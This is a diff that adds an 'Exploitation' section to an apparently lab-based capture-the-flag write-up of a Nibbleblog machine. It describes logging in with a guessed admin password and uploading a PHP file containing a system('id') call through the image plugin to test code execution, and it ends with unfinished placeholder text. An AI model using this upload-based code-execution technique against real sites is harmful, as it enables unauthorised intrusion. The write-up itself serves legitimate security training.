@@ -354,3 +354,40 @@ Let us recap what we have found so far:
 * Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
 * Uncovered clues that led us to a valid admin password of nibbles
 
+***
+
+## Exploitation
+
+Once in the admin portal using our guessed password (Nibbles) and confirmed username (admin), we see the following pages:
+
+* Publish
+* Comments
+* Manage
+* Settings
+* Themes
+* Plugins
+
+In Plugins, let's upload a file under the Upload Image. We will check for code execution by uploading a file with the contents `<?php system('id'); ?>`
+
+We get a bunch of errors but looks like it uploaded.
+
+```
+Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
+
+Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
+
+Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117
+
+Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118
+
+Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43
+
+Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
+```
+
+
+
+?????????
+
+?????????
+
